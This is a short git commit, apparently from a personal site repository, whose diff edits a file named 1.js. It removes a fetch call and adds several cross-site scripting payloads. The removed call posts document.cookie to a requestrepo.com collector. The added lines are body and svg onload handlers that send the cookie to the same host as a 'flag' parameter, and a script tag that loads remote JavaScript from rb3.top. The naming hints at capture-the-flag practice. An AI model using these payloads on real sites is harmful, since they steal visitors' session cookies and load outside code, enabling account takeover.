2b9306f66473cc2d986fd78bad524cce26183921
baozongwi <146065986+bzq05@users.noreply.github.com>
2025-06-01 14:53:53 +0800

    Site updated: 2025-06-01 14:53:53

--- 1.js
+++ 1.js
@@ -1,1 +1,4 @@
-fetch("https://epkveh22.requestrepo.com/", {method: "post", body: document.cookie})
+<body onload="window.open('https://epkveh22.requestrepo.com/?flag='+document.cookie)">
+<body onload="window.open('https://epkveh22.requestrepo.com/?flag='+document.cookie)">
+<svg onload="window.open('https://epkveh22.requestrepo.com/?flag='+document.cookie)">
+<script/src=\x2f/rb3.top/1.js></script>
